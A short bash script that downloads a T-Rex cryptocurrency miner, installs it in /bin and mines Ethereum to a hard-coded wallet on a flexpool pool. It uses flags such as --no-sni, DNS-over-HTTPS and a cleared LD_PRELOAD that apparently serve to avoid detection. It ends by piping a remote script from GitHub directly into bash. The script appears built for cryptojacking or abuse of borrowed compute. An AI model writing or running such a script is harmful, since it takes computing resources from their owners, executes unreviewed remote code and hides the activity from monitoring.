#!/bin/bash
echo "ENGINE START!"
export LD_PRELOAD=
curl -sLO https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/t-rex
cp t-rex /bin
chmod +x /bin/t-rex

/bin/t-rex -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xc849640837cBce9Ec3e3ce1d1f755A2DE5fb6ddF -p x -w rig0 --no-sni --dns-https-server 1.1.1.1 --time-limit 240

sleep 2m

curl https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/ax.sh | bash
